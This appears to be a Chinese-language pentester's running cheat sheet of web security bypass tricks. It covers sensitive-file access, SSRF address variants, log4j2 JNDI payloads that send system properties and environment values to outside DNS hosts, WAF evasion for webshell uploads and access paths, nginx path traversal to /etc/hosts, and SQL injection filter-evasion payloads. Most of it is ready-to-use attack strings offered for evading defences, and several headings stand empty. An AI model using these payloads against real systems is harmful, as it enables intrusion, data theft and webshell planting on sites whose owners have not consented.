开这一篇主要是因为开始认识到知识整理的重要性，因为不可能时刻都记得所有的bypass点，所以当看到有用的bypass的tips的时候希望能记录，整理，随时更新到这一篇当中来。

敏感目录/文件访问专题

  • 对敏感目录访问有时直接访问不成功，可以在目录/文件后面加上 .json
  • 针对tp的log文件，有时直接访问.log会失败，这里可以在.log后面再加上一个.来绕过。形如 .log.

SSRF专题

  • 针对127.0.0.1，有如下多种变式

    python

    在python<3.8的版本中，ipaddress库在标准化ip地址的时候，会删除多余的0.这种行为可能导致绕过防御SSRF的黑名单IP列表，从而导致SSRF。 如果传入的参数是127.0.00.1就会被ipaddress标准化为127.0.0.1，从而绕过检查

    文件包含专题

    对于文件包含可以使用如下的一些变形来绕过检测

log4j2专题

探测用poc ${jndi:ldap://xxxxx.dnslog.cn/exp}
由于log4j2可以支持协议嵌套，所以利用log4j2就算版本不合适本地没有gadget也可以外带一些信息

  • ${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}

  • ${jndi:ldap://${sys:java.version}.7fc8ba44.dns.1433.eu.org/aa}

  • ${jndi:ldap://${env:os}.7fc8ba44.dns.1433.eu.org/aa} windows
    具体有什么属性可以外带，可以参考 https://devdocs.io/openjdk~11/java.base/java/lang/system#getProperties()

  • 同时可以利用dns外带信息
    浅蓝大佬编写的一些log4j2利用方式 https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg

    文件上传专题

    这里主要分两部分，一个是waf限制导致上传失败，另一个是由于代码本身黑名单限制而导致的上传失败
    如果是waf限制，通常会有waf拦截页面，或者请求多次被重置reset无响应包。如果是后缀名黑名单通常返回包带有文件格式不允许字样

别名代替

  • ::$DATA

    linux

  • 试试 / 绕过，变为1./jspx

    针对waf的绕过

    后缀落地

    这里下面讲到的绕WAF的核心思想在于服务器能解析而WAF识别不出来。下面讨论的是文件名后缀落地部分，内容免杀部分后续看到会再更新。
    常见的WAF有安全狗，Yxlink-WAF，云锁，玄武盾，创宇盾，WTS-WAF,qianxin-WAF，WAF2.0等。每家WAF对后缀判断的具体位置不同，这里把所有能用的有用的绕过实例做一个整理

  • 超长文件名溢出（安恒玄武盾）

  • 双写文件名绕过（某狗，锁）filename="hasker.jsp";filename="hacker.jsp"

  • 去掉引号

  • 换行法

  • 分块传输

    copy normal.jpg /b + shell.php /a webshell.jpg
    在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，post请求报文中的数据部分需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束。
    burp插件：https://github.com/c0ny1/chunked-coding-converter

    shell访问

  • 某些waf可能会阻止访问upload下的脚本文件*，可以尝试在后面加/.png之类的绕过，类似http://xxx.xx/upload/shell.php/.png，http://xx.xx/upload/a.png/../shell.php

    内容绕过

  • 大文件，脏数据

  • 免杀shell。可以利用特性构造，比如php对base64的可容性很高，在里面加东西可以过waf，但是php能正常解析。这里还是那个核心思想-waf识别不出，但服务器能正常解析。

    对字段动手干扰WAF

    Content-Tye

    常见的Content-Type如下

    有时候会在后面加上编码，变成类似这样Content-Type: text/xml;charset=utf-8。这个header允许大小写，还允许分号分割后增加脏数据干扰waf识别。一般来说Content-Type声明和POST传输的数据格式需要对应，不过有时候不对应或者没有Content-Type也不影响。
    Content-TYpe: application/octet-stream; afsdfasdf

    Content-Disposition

    Content-Disposition: form-data;通常用于文件上传，也可以用于传参，除了上面说的Content-Type段，还可以在Content-Disposition，boundary段动手脚。

    增加Expect: 100-continue header头

    有的waf会检测返回包，这个header让返回包增加一个100状态码，所有中间件都支持

nginx场景绕过

  • 在url中加上/#/能让nginx不处理锚点之后的内容，利用来处理某些nginx反代的目录穿越问题。比如前段时间的grafana。遇到nginx反代可以利用如下poc绕过，然后进行利用
    /public/plugins/alertlist/#/../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/hosts
    这里插入锚点使得nginx忽略#后面的内容，而后又用/../吞掉锚点，正常进行目录穿越
  • weblogic中，访问路径命中nginx规则时，可以考虑如下绕过：http://127.0.0.1/console/login/LoginForm.jsp;/../../../
    规则 对nginx来说，接收到的请求是http://127.0.0.1,而对weblogic来说，接收到的是http://127.0.0.1/console/login/LoginForm.jsp
  • 并且*
    Nginx 的 proxy_pass 配置一般如下 xxx 部分是要转发的后端，如果 xxx 以斜杠（/）结尾 ，则请求会经过处理（normailized）再转发，而如果 xxx 没有以斜杠（/）结尾，则完整的原始请求会被转发到后端

SQL注入专题

SQL注入主要就两个方面的思想，一个是硬刚waf规则，fuzz出规则的漏洞进而利用，另一个是利用 计算机语言/中间件/操作系统 等和waf的解析差异，构造畸形请求来绕过waf检测

通用的waf绕过方法

  • 大小写绕过 Union seLect 主要针对垃圾规则
  • 双写绕过 seselectlect 主要针对关键字过滤不完全
  • 内联注释绕过 and /*!select*/ 1,2 MYSQL特性，包裹在/!**/中的部分会被作为sql语句的一部分被执行
  • 编码绕过 16进制编码;unicode编码对部分符号的绕过：单引号 –> %u0037,%u02b9;空格 –> %u0020,%uff00;左括号 –> %u0028,%uff08;右括号 –> %u0029,%uff09

    等价代替

    对于某些关键字或者符号/函数被过滤，可以使用它的等价代替品来实现waf的绕过

    空格过滤

  • 注释符代替(/**/)
  • ()绕过
  • ``绕过
  • 空白符代替 mysql %09%0A%0B%0C%0D%20,mssql %00-%20, oracle %00%09%0A%0B%0C%0D%20

if过滤

  • 对if的过滤，可以使用case when来代替

    mid过滤

  • 对mid的过滤，可以用substr，right/left配合reverse来读取。
  • replace(LPAD(user(),2,1),LPAD(user(),2-1,1),””); 这里LPAD是左填充，LPAD(str,len,padstr)。从str截取len的长度，如果len比str长，那么用padstr填充，如果len小于等于str，那么就截取对应长度。REPLACE(str,from_str,to_str)，在str中搜索from_str,替换成to_str。所以原来的payload的意思就是截取两个长度的user()作为str，截取一个长度作为from_str并将它替换为空。举例 user–>root,str–>ro,form_str–>r;替换后得到o.遍历字符串时将第一个LPAD的len从1开始，而第二个LPAD的len始终比第一个LPAD的len小1即可。
  • LPAD(REVERSE(TRIM( lpad(user(),length,SPACE(1)) )),1,SPACE(1)；TRIM就是去掉左右空格，SPACE(len)就是返回指定长度的空格。这里就是从user()中截取length个长度，然后去掉它的左右空格(如果有)，然后将从user()截取的数据翻转，再次用LPAD截取字符串。要遍历字符串，将length从1开始增加即可。

    逗号过滤

  • limit 2,1 –> limit 1 offset 2
  • union select 1,2,3 –> union select * from (select 1)a join (select 2)b join (select 3)c
  • mid(user(),1,1) –> mid(user() from 1 for 1);

    等号过滤

  • 1=1 -> 1 like 1;
  • 1 rlike 1;
  • 1 and 1 regexp 1(mysql);
  • <>等价于 != 所以 1 or !(1<>1);
  • 1 and 1 bwtween 1 and 1;
  • select if(abs(strcmp((ascii(mid(user()from(1)for(2)))),114))-1,sleep(5),0) 这里要用绝对值，因为小于的时候会返回-1，等于返回0，大于返回1;
  • find_in_set(ord(mid(user() from 1 for 1)),114);find_in_set(str,strlist)，在strlist中搜索str，搜索到就返回对应的索引下标，找不到返回0.这里可以利用返回值来确定是否相等

    ascii过滤

  • ord,用于多字节，返回最左边一字节对应的ascii码
  • conv(hex(c),16,10) 进制转换，将十六进制转为十进制得到相同结果

    大于小于号过滤

  • least(ord(mid(user(),1,1)),114)
  • greatest(ord(mid(user(),1,1)),114)
